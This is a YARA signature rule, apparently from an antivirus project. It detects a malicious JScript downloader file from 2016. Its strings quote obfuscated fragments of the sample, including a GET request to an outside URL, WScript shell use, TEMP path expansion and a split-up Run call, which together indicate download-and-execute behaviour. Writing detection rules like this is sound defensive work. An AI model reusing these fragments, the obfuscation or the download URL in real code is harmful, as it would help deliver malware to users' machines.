rule sig_20160428_077984f0a3d4299b929dd742cf4bfc6e {
  meta:
    description = "datamaliciousorder - file 20160428_077984f0a3d4299b929dd742cf4bfc6e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "66f4aa4926a4d14653bc7a133cd3bc9f10575165c188697fda7f04ed067c5df8"

  strings:
    $s1  = "KijXqpUifPhxDxtIblGre[HipXotTwwLijHrwZlyAmy](\"G\" + \"ET\", \"http://switchright.com/2yshda\", false);" fullword ascii
    $s2  = "function SksCdaPjpIbnJneFowDov(MvqNbvQcpHwsZjjKqnMey){TkmHhtBidHszLjkMvfIua[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function EqeAojBslHrvPemExyDtz() {return TkmHhtBidHszLjkMvfIua[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function SksCdaPjpIbnJneFowDov(MvqNbvQcpHwsZjjKqnMey){TkmHhtBidHszLjkMvfIua[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "var TkmHhtBidHszLjkMvfIua = function ZrkIguIwnIarVgtUtgIsz() {return BrzFjsWtsYspBnfOwrQsj[NhbIsxLhbTdmHvpDjcJym](\"WScript\"+\"" ascii
    $s6  = "var BrzFjsWtsYspBnfOwrQsj = this[\"WScript\"];" fullword ascii
    $s7  = "var TkmHhtBidHszLjkMvfIua = function ZrkIguIwnIarVgtUtgIsz() {return BrzFjsWtsYspBnfOwrQsj[NhbIsxLhbTdmHvpDjcJym](\"WScript\"+\"" ascii
    $s8  = "function EqeAojBslHrvPemExyDtz() {return TkmHhtBidHszLjkMvfIua[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "function GleCmlNwaDihPupHmxSot(TilAepZdeCacGgkKhuOwc, EeaHrnBmpFrsEssJtdJgv){IoyCjjBahMbfTclGpsJky = IoyCjjBahMbfTclGpsJky * 1; " ascii
    $s10 = "return TilAepZdeCacGgkKhuOwc - EeaHrnBmpFrsEssJtdJgv;};" fullword ascii
    $s11 = "function SrwUiiRmtMkkSrnJxnYld(){return CwiPtxDbpQgpPwvRjoKed + \"\";};" fullword ascii
    $s12 = "if (KijXqpUifPhxDxtIblGre[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function OguGmkOfsMsoOdjBwbRyq() {return ((QnjSftBplSsxXmwErsCcj == true) && (QnjSftBplSsxXmwErsCcj == YzlSmtRqgHyyOezNimAyk)) ?" ascii
    $s14 = "function OguGmkOfsMsoOdjBwbRyq() {return ((QnjSftBplSsxXmwErsCcj == true) && (QnjSftBplSsxXmwErsCcj == YzlSmtRqgHyyOezNimAyk)) ?" ascii
    $s15 = "function MkvMedMkkFbnGlkJjgEhv(){return NhbIsxLhbTdmHvpDjcJym;};" fullword ascii
    $s16 = "function AoaEmyJhhUioNmiZbcDaf(WsaSheSubLrnAuxNziJdi) {var BjgAzqEpcJyyWqcFjoXxt = (1, 2, 3, 4, 5, WsaSheSubLrnAuxNziJdi); retur" ascii
    $s17 = "var BsbFceNpnMfuWviGcpJhg = false;" fullword ascii
    $s18 = "function DnuVabBnkChrQccJjeSmx()" fullword ascii
    $s19 = "var TtlOtwMvzXjjLovAssQfr = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "var QnjSftBplSsxXmwErsCcj = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}